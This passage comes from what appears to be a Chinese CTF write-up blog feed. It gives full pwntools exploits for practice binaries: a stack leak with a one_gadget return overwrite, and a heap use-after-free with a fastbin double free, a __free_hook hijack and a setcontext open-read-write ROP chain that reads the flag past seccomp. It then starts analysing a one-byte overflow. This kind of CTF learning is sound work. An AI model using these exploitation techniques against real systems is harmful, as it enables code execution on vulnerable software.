number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your choice: '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Length: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Data: '</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">0x8</span>add<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ff ff ff ff ff ff ff ff '</span><span class="token punctuation">)</span>stack <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">48</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Result in hex: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span>  u64<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> <span class="token number">0xe3b01</span> <span class="token operator">+</span> libc_basepay <span class="token operator">=</span> <span class="token string">b'\x11'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> <span class="token string">b'\xff'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>add<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="camera"><a href="#camera" class="headerlink" title="camera"></a>camera</h2><p>最后一题是一道<code>2.31</code>的堆题，先检查保护，沙箱</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  camera  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/game_2023/xiangshanbeijuesai/camera/camera/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled☁  camera  seccomp-tools dump ./pwn line  CODE  JT   JF      K<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch 0001: 0x15 0x00 0x02 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0004 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number 0003: 0x15 0x00 0x01 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> execve<span class="token punctuation">)</span> goto 0005 0004: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL 0005: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在三个功能，<code>add</code>里将申请的堆地址存入<code>heap_ptr</code>并将<code>flag</code>位置<code>1</code>，<code>load</code>将<code>heap_ptr</code>存入<code>selecetd_ptr</code>，并且将指向上一个堆地址的地址存入<code>last_ptr</code>，将<code>flag</code>位置<code>2</code>，<code>bss</code>段的三个变量整体可以看作一个结构体，分别是<code>heap_ptr</code>、<code>last_ptr</code>、<code>flag</code>，<code>show_delete</code>函数<code>show</code>出内容之后<code>delete</code>掉堆并且将<code>flag</code>位置<code>0</code>，漏洞出在没有将<code>last_ptr</code>置<code>0</code>，所以修复就可以将这个地址置<code>0</code>，而在修复前这里就存在<code>uaf</code>漏洞，所以可以利用这个<code>uaf</code>进行<code>fastbin</code>的<code>double free</code>，最后进行堆上的<code>orw</code>（回头系统学习一下…复现照抄了</p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your choise'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please select a film of your preference within your budget.'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_delete</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your choise'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Do you want to take a few pictures?'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input your choise'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'whitch one do you want to load'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecb61</span>libc <span class="token operator">=</span>  ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesetcontext <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basemagic_gadget <span class="token operator">=</span> <span class="token number">0x0000000000151990</span> <span class="token operator">+</span> libc_basepop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000023b6a</span> <span class="token operator">+</span> libc_basepop_rsi_ret <span class="token operator">=</span> <span class="token number">0x000000000002601f</span> <span class="token operator">+</span> libc_basepop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_basepop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000036174</span> <span class="token operator">+</span> libc_basepop_rdx_r12_ret <span class="token operator">=</span> <span class="token number">0x0000000000119211</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x0000000000022679</span> <span class="token operator">+</span> libc_basesyscall_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    load<span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'The film content: '</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x24f</span>orw_addr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x500</span>add<span class="token punctuation">(</span><span class="token number">0x60</span> <span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>magic_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>orw_addr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x30f</span>bss_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> <span class="token string">b'./flag\x00\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>setcontext <span class="token operator">+</span> <span class="token number">61</span><span class="token punctuation">)</span>stack <span class="token operator">+=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">)</span>stack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>orw_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">,</span> stack<span class="token punctuation">)</span>orw <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>orw<span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall_ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> orw<span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>load<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>show_delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考文章：<a href="https://www.cnblogs.com/pwnfeifei/p/15819825.html#/">https://www.cnblogs.com/pwnfeifei/p/15819825.html#/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目下载地址：链接：&lt;a href=&quot;https://pan.baidu.com/s/1s02lruOFCoBf8CUWpMg5qA?pwd=lays&quot;&gt;https://pan.baidu.com/s/1s02lruOFCoBf8CUWpMg5qA?pwd=lays&lt;/a&gt;</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2024beginctf-pwn</title>
    <link href="https://starrysky1004.github.io/2024/02/09/2024beginctf-pwn/2024beginctf-pwn/"/>
    <id>https://starrysky1004.github.io/2024/02/09/2024beginctf-pwn/2024beginctf-pwn/</id>
    <published>2024-02-08T18:58:04.000Z</published>
    <updated>2024-07-14T00:24:51.520Z</updated>
    
    <content type="html"><![CDATA[<h2 id="one-byte"><a href="#one-byte" class="headerlink" title="one_byte"></a>one_byte</h2><p>检查保护，开了地址随机化，没开canary</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/starrysky/beginctf/one_byte/pwn'</span>    Arch<span class="token punctuation">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token punctuation">:</span>    Full RELRO    Stack<span class="token punctuation">:</span>    No canary found    NX<span class="token punctuation">:</span>       NX enabled    PIE<span class="token punctuation">:</span>      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看程序，发现可以溢出一字节，也对应了题目的one-byte，程序会打开flag文件并且输出一字节，要读出flag必然需要printf，所以覆盖返回地址低位到printf处即可</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+7h] [rbp-9h] BYREF</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+Fh] [rbp-1h] BYREF</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to beginctf!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Here is your gift: %c\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Are you satisfied with the result?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">0x12uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  